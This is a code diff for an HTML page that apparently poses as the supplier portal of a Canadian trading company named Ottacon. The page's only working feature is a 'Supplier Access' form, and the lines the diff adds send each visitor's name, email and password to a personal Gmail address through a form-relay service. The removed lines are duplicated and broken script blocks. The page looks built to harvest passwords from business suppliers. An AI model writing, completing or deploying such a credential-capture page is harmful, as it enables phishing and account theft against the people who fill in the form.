@@ -1,7 +1,11 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <meta name="description" content="Ottacon Trading and Contracting Company welcomes suppliers, manufacturers, and distributors interested in supplying business products.">  <title>Ottacon Trading and Contracting Company</title>  <style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Ottacon Trading and Contracting Company welcomes suppliers, manufacturers, and distributors interested in supplying business products.">
+  <title>Ottacon Trading and Contracting Company</title>
+  <style>
     * {
       box-sizing: border-box;
       margin: 0;
@@ -298,222 +302,217 @@
         padding: 45px 6%;
       }
     }
-  </style></head><body>  <!-- SUPPLIER ACCESS: FIRST THING VISITORS SEE -->  <section class="supplier" id="suppliers">
-    <div class="supplier-box">  <p class="company-label">
-    OTTACON TRADING AND CONTRACTING COMPANY
-  </p>
+  </style>
+</head>
+<body>
 
-  <h1>Supplier Access</h1>
+  <!-- SUPPLIER ACCESS: FIRST THING VISITORS SEE -->
+  <section class="supplier" id="suppliers">
+    <div class="supplier-box">
+      <p class="company-label">
+        OTTACON TRADING AND CONTRACTING COMPANY
+      </p>
 
-  <p class="supplier-description">
-    Are you a supplier, manufacturer, or distributor?
-    Enter your details to access our product requirements.
-  </p>
+      <h1>Supplier Access</h1>
 
-  <form id="supplier-form">
+      <p class="supplier-description">
+        Are you a supplier, manufacturer, or distributor?
+        Enter your details to access our product requirements.
+      </p>
 
-    <label for="full-name">Full Name</label>
+      <form id="supplier-form">
+        <label for="full-name">Full Name</label>
+        <input
+          type="text"
+          id="full-name"
+          name="name"
+          placeholder="Enter your full name"
+          autocomplete="name"
+          required
+        >
 
-    <input
-      type="text"
-      id="full-name"
-      name="name"
-      placeholder="Enter your full name"
-      autocomplete="name"
-      required
-    >
+        <label for="email">Email Address</label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Enter your email address"
+          autocomplete="email"
+          required
+        >
 
-    <label for="email">Email Address</label>
+        <label for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Enter your password"
+          autocomplete="current-password"
+          required
+        >
 
-    <input
-      type="email"
-      id="email"
-      name="email"
-      placeholder="Enter your email address"
-      autocomplete="email"
-      required
-    >
+        <button type="submit" class="submit-button">
+          View Products
+        </button>
 
-    <label for="password">Password</label>
+        <p class="form-note">
+          Enter your details to continue.
+        </p>
 
-<input
-  type="password"
-  id="password"
-  name="password"
-  placeholder="Enter your password"
-  autocomplete="current-password"
-  required
->
+        <p id="form-message" role="status" aria-live="polite"></p>
+      </form>
+    </div>
+  </section>
 
-    <button type="submit" class="submit-button">
-      View Products
-    </button>
-
-    <p class="form-note">
-      Enter your details to continue.
-    </p>
-
-    <p id="form-message" role="status" aria-live="polite"></p>
-
-  </form>
-
-</div>
-
-  </section>  <!-- COMPANY HEADER -->  <header>
+  <!-- COMPANY HEADER -->
+  <header>
     <div class="company-name">
       OTTACON TRADING AND CONTRACTING COMPANY
-    </div><div class="tagline">
-  Business Supplies | Trading | Contracting
-</div>
+    </div>
+    <div class="tagline">
+      Business Supplies | Trading | Contracting
+    </div>
+  </header>
 
-  </header>  <!-- NAVIGATION -->  <nav aria-label="Main navigation">
+  <!-- NAVIGATION -->
+  <nav aria-label="Main navigation">
     <a href="#home">Home</a>
     <a href="#about">About Us</a>
     <a href="#products">Product Categories</a>
     <a href="#documents">Supplier Documents</a>
     <a href="#contact">Contact</a>
-  </nav>  <main><!-- HOME -->
+  </nav>
 
-<section class="hero" id="home">
-  <h2>Your Business Partner for Sourcing and Supply</h2>
+  <main>
+    <!-- HOME -->
+    <section class="hero" id="home">
+      <h2>Your Business Partner for Sourcing and Supply</h2>
+      <p>
+        Ottacon Trading and Contracting Company welcomes suppliers,
+        manufacturers, and distributors across a broad range of
+        product categories to explore potential business opportunities.
+      </p>
+    </section>
 
-  <p>
-    Ottacon Trading and Contracting Company welcomes suppliers,
-    manufacturers, and distributors across a broad range of
-    product categories to explore potential business opportunities.
-  </p>
-</section>
+    <!-- ABOUT US -->
+    <section class="content-section" id="about">
+      <div class="about-content">
+        <h2 class="section-heading">About Ottacon</h2>
+        <p>
+          Ottacon Trading and Contracting Company is a Canada-based
+          trading and contracting business focused on product sourcing
+          and developing supplier relationships.
+        </p>
+        <p>
+          We welcome enquiries from companies, manufacturers,
+          distributors, and other potential business partners interested
+          in supplying goods.
+        </p>
+      </div>
+    </section>
 
-<!-- ABOUT US -->
+    <!-- PRODUCT CATEGORIES -->
+    <section class="content-section products-section" id="products">
+      <h2 class="section-heading">Product Categories</h2>
+      <p class="section-intro">
+        We are interested in sourcing products across the following
+        categories. Specific purchasing requirements will be provided
+        when our product document is available.
+      </p>
 
-<section class="content-section" id="about">
-  <div class="about-content">
+      <div class="categories">
+        <article class="category-card">
+          <h3>Tools & Hardware</h3>
+          <p>Tools, hardware products, fittings, and related supplies.</p>
+        </article>
 
-    <h2 class="section-heading">About Ottacon</h2>
+        <article class="category-card">
+          <h3>Software & Technology</h3>
+          <p>Software products, IT solutions, and technology supplies.</p>
+        </article>
 
-    <p>
-      Ottacon Trading and Contracting Company is a Canada-based
-      trading and contracting business focused on product sourcing
-      and developing supplier relationships.
-    </p>
+        <article class="category-card">
+          <h3>Electronics</h3>
+          <p>Electronic devices, components, and accessories.</p>
+        </article>
 
-    <p>
-      We welcome enquiries from companies, manufacturers,
-      distributors, and other potential business partners interested
-      in supplying goods.
-    </p>
+        <article class="category-card">
+          <h3>Industrial Equipment</h3>
+          <p>Machinery, equipment, and industrial supply products.</p>
+        </article>
 
-  </div>
-</section>
+        <article class="category-card">
+          <h3>Household Goods</h3>
+          <p>Household products and everyday-use goods.</p>
+        </article>
 
-<!-- PRODUCT CATEGORIES -->
+        <article class="category-card">
+          <h3>General Merchandise</h3>
+          <p>A broad range of products for business procurement.</p>
+        </article>
+      </div>
+    </section>
 
-<section class="content-section products-section" id="products">
+    <!-- SUPPLIER DOCUMENTS -->
+    <section class="content-section documents-section" id="documents">
+      <h2 class="section-heading">Supplier Documents</h2>
+      <p>
+        Our product requirements PDF will be made available here
+        when it is ready.
+      </p>
+    </section>
 
-  <h2 class="section-heading">Product Categories</h2>
+    <!-- CONTACT -->
+    <section class="content-section contact-section" id="contact">
+      <h2 class="section-heading">Contact Ottacon</h2>
+      <p>
+        Interested in supplying our company? Start with the Supplier
+        Access form at the top of this page.
+      </p>
+      <p style="margin-top: 10px;">Canada</p>
+    </section>
+  </main>
 
-  <p class="section-intro">
-    We are interested in sourcing products across the following
-    categories. Specific purchasing requirements will be provided
-    when our product document is available.
-  </p>
-
-  <div class="categories">
-
-    <article class="category-card">
-      <h3>Tools & Hardware</h3>
-      <p>Tools, hardware products, fittings, and related supplies.</p>
-    </article>
-
-    <article class="category-card">
-      <h3>Software & Technology</h3>
-      <p>Software products, IT solutions, and technology supplies.</p>
-    </article>
-
-    <article class="category-card">
-      <h3>Electronics</h3>
-      <p>Electronic devices, components, and accessories.</p>
-    </article>
-
-    <article class="category-card">
-      <h3>Industrial Equipment</h3>
-      <p>Machinery, equipment, and industrial supply products.</p>
-    </article>
-
-    <article class="category-card">
-      <h3>Household Goods</h3>
-      <p>Household products and everyday-use goods.</p>
-    </article>
-
-    <article class="category-card">
-      <h3>General Merchandise</h3>
-      <p>A broad range of products for business procurement.</p>
-    </article>
-
-  </div>
-</section>
-
-<!-- SUPPLIER DOCUMENTS -->
-
-<section class="content-section documents-section" id="documents">
-
-  <h2 class="section-heading">Supplier Documents</h2>
-
-  <p>
-    Our product requirements PDF will be made available here
-    when it is ready.
-  </p>
-
-</section>
-
-<!-- CONTACT -->
-
-<section class="content-section contact-section" id="contact">
-
-  <h2 class="section-heading">Contact Ottacon</h2>
-
-  <p>
-    Interested in supplying our company? Start with the Supplier
-    Access form at the top of this page.
-  </p>
-
-  <p style="margin-top: 10px;">Canada</p>
-
-</section>
-
-  </main>  <!-- FOOTER -->  <footer>
+  <!-- FOOTER -->
+  <footer>
     <p>
       &copy; <span id="year"></span>
       Ottacon Trading and Contracting Company.
       All rights reserved.
     </p>
-  </footer>  <!-- FORM SUBMISSION -->  <script>
-    document.getElementById("year").textContent =
-      new Date().getFullYear();
+  </footer>
+
+  <!-- FORM SUBMISSION SCRIPT -->
+  <script>
+    document.getElementById("year").textContent = new Date().getFullYear();
 
     const supplierForm = document.getElementById("supplier-form");
     const formMessage = document.getElementById("form-message");
-    const submitButton = supplierForm.querySelector(
-      'button[type="submit"]'
-    );
+    const submitButton = supplierForm.querySelector('button[type="submit"]');
 
     supplierForm.addEventListener("submit", async function (event) {
       event.preventDefault();
 
       const fullName = document.getElementById("full-name").value.trim();
-const email = document.getElementById("email").value.trim();
-const password = document.getElementById("password").value;
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
 
       if (!fullName || !email || !password) {
-  formMessage.textContent =
-    "Please enter your full name, email address, and password.";
-  return;
-      
+        formMessage.textContent = "Please complete all required fields.";
+        return;
       }
 
       submitButton.disabled = true;
       submitButton.textContent = "Submitting...";
       formMessage.textContent = "";
+
+      const formData = {
+        name: fullName,
+        email: email,
+        password: password,
+        _subject: "New Ottacon Supplier Registration",
+        _template: "table"
+      };
 
       try {
         const response = await fetch(
@@ -534,370 +533,18 @@ const password = document.getElementById("password").value;
           throw new Error("Submission failed");
         }
 
-        formMessage.textContent =
-          "Thank you! Your details have been submitted successfully. " +
-          "Product access will be available when our document is ready.";
-
+        formMessage.textContent = "Thank you! Your supplier details have been submitted.";
         supplierForm.reset();
 
       } catch (error) {
-        formMessage.textContent =
-          "We could not submit your details. Please try again later.";
+        console.error("Submission error:", error);
+        formMessage.textContent = "Submission failed. Please try again later.";
       } finally {
         submitButton.disabled = false;
         submitButton.textContent = "View Products";
       }
     });
-    <script>
-  document.getElementById("year").textContent =
-    new Date().getFullYear();
-
-  const supplierForm = document.getElementById("supplier-form");
-  const formMessage = document.getElementById("form-message");
-  const submitButton = supplierForm.querySelector(
-    'button[type="submit"]'
-  );
-
-  supplierForm.addEventListener("submit", async function (event) {
-    event.preventDefault();
-
-    const fullName = document.getElementById("full-name").value.trim();
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value;
-
-    if (!fullName || !email || !password) {
-      formMessage.textContent =
-        "Please complete all required fields.";
-      return;
-    }
-
-    submitButton.disabled = true;
-    submitButton.textContent = "Submitting...";
-    formMessage.textContent = "";
-
-    const formData = {
-      name: fullName,
-      email: email,
-      _subject: "New Ottacon Supplier Registration",
-      _template: "table"
-    };
-
-    try {
-      const response = await fetch(
-        "https://formsubmit.co/ajax/qardexcapital2@gmail.com",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          const formData = {
-  name: fullName,
-  email: email,
-  password : password,        
-  _subject: "New Ottacon Supplier Registration",
-  _template: "table"
-};
-          body: JSON.stringify(formData)
-        }
-      );
-
-      const result = await response.json();
-
-      if (!response.ok || result.success === false) {
-        throw new Error("Submission failed");
-      }
-
-      formMessage.textContent =
-        "Thank you! Your supplier details have been submitted.";
-
-      supplierForm.reset();
-
-    } catch (error) {
-      console.error("Submission error:", error);
-
-      formMessage.textContent =
-        "Submission failed. Please try again later.";
-
-    } finally {
-      submitButton.disabled = false;
-      submitButton.textContent = "View Products";
-    }
-  });
-<script>
-  document.getElementById("year").textContent =
-    new Date().getFullYear();
-
-  const supplierForm = document.getElementById("supplier-form");
-  const formMessage = document.getElementById("form-message");
-  const submitButton = supplierForm.querySelector(
-    'button[type="submit"]'
-  );
-
-  supplierForm.addEventListener("submit", async function (event) {
-    event.preventDefault();
-
-    const fullName = document.getElementById("full-name").value.trim();
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value;
-
-    if (!fullName || !email || !password) {
-      formMessage.textContent =
-        "Please complete all required fields.";
-      return;
-    }
-
-    submitButton.disabled = true;
-    submitButton.textContent = "Submitting...";
-    formMessage.textContent = "";
-
-    const formData = {
-      name: fullName,
-      email: email,
-      _subject: "New Ottacon Supplier Registration",
-      _template: "table"
-    };
-
-    try {
-      const response = await fetch(
-        "https://formsubmit.co/ajax/qardexcapital2@gmail.com",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(formData)
-        }
-      );
-
-      const result = await response.json();
-
-      if (!response.ok || result.success === false) {
-        throw new Error("Submission failed");
-      }
-
-      formMessage.textContent =
-        "Thank you! Your supplier details have been submitted.";
-
-      supplierForm.reset();
-
-    } catch (error) {
-      console.error("Submission error:", error);
-
-      formMessage.textContent =
-        "Submission failed. Please try again later.";
-
-    } finally {
-      submitButton.disabled = false;
-      submitButton.textContent = "View Products";
-    }
-  });
-<script>
-  document.getElementById("year").textContent =
-    new Date().getFullYear();
-
-  const supplierForm = document.getElementById("supplier-form");
-  const formMessage = document.getElementById("form-message");
-  const submitButton = supplierForm.querySelector(
-    'button[type="submit"]'
-  );
-
-  supplierForm.addEventListener("submit", async function (event) {
-    event.preventDefault();
-
-    const fullName = document.getElementById("full-name").value.trim();
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value;
-
-    if (!fullName || !email || !password) {
-      formMessage.textContent =
-        "Please complete all required fields.";
-      return;
-    }
-
-    submitButton.disabled = true;
-    submitButton.textContent = "Submitting...";
-    formMessage.textContent = "";
-
-    const formData = {
-      name: fullName,
-      email: email,
-      _subject: "New Ottacon Supplier Registration",
-      _template: "table"
-    };
-
-    try {
-      const response = await fetch(
-        "https://formsubmit.co/ajax/qardexcapital2@gmail.com",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(formData)
-        }
-      );
-
-      const result = await response.json();
-
-      if (!response.ok || result.success === false) {
-        throw new Error("Submission failed");
-      }
-
-      formMessage.textContent =
-        "Thank you! Your supplier details have been submitted.";
-
-      supplierForm.reset();
-
-    } catch (error) {
-      console.error("Submission error:", error);
-
-      formMessage.textContent =
-        "Submission failed. Please try again later.";
-
-    } finally {
-      submitButton.disabled = false;
-      submitButton.textContent = "View Products";
-    }
-  });
-<script>
-  document.getElementById("year").textContent =
-    new Date().getFullYear();
-
-  const supplierForm = document.getElementById("supplier-form");
-  const formMessage = document.getElementById("form-message");
-  const submitButton = supplierForm.querySelector(
-    'button[type="submit"]'
-  );
-
-  supplierForm.addEventListener("submit", async function (event) {
-    event.preventDefault();
-
-    const fullName = document.getElementById("full-name").value.trim();
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value;
-
-    if (!fullName || !email || !password) {
-      formMessage.textContent =
-        "Please complete all required fields.";
-      return;
-    }
-
-    submitButton.disabled = true;
-    submitButton.textContent = "Submitting...";
-    formMessage.textContent = "";
-
-    const formData = {
-      name: fullName,
-      email: email,
-      _subject: "New Ottacon Supplier Registration",
-      _template: "table"
-    };
-
-    try {
-      const response = await fetch(
-        "https://formsubmit.co/ajax/qardexcapital2@gmail.com",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(formData)
-        }
-      );
-
-      const result = await response.json();
-
-      if (!response.ok || result.success === false) {
-        throw new Error("Submission failed");
-      }
-
-      formMessage.textContent =
-        "Thank you! Your supplier details have been submitted.";
-
-      supplierForm.reset();
-
-    } catch (error) {
-      console.error("Submission error:", error);
-
-      formMessage.textContent =
-        "Submission failed. Please try again later.";
-
-    } finally {
-      submitButton.disabled = false;
-      submitButton.textContent = "View Products";
-    }
-  });
-document.getElementById("year").textContent =
-    new Date().getFullYear();
-
-  const supplierForm = document.getElementById("supplier-form");
-  const formMessage = document.getElementById("form-message");
-  const submitButton = supplierForm.querySelector(
-    'button[type="submit"]'
-  );
-
-  supplierForm.addEventListener("submit", async function (event) {
-    event.preventDefault();
-
-    const fullName = document.getElementById("full-name").value.trim();
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value;
-
-    if (!fullName || !email || !password) {
-      formMessage.textContent =
-        "Please complete all required fields.";
-      return;
-    }
-
-    submitButton.disabled = true;
-    submitButton.textContent = "Submitting...";
-    formMessage.textContent = "";
-
-    const formData = {
-      name: fullName,
-      email: email,
-      _subject: "New Ottacon Supplier Registration",
-      _template: "table"
-    };
-
-    try {
-      const response = await fetch(
-        "https://formsubmit.co/ajax/qardexcapital2@gmail.com",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(formData)
-        }
-      );
-
-      const result = await response.json();
-
-      if (!response.ok || result.success === false) {
-        throw new Error("Submission failed");
-      }
-
-      formMessage.textContent =
-        "Thank you! Your supplier details have been submitted.";
-
-      supplierForm.reset();
-
-    } catch (error) {
-      console.error("Submission error:", error);
-
-      formMessage.textContent =
-        "Submission failed. Please try again later.";
-
-    } finally {
-      submitButton.disabled = false;
-      submitButton.textContent = "View Products";
-    }
-  });
-  </script></body>
-      </html>
+  </script>
+</body>
+    </html>
+    
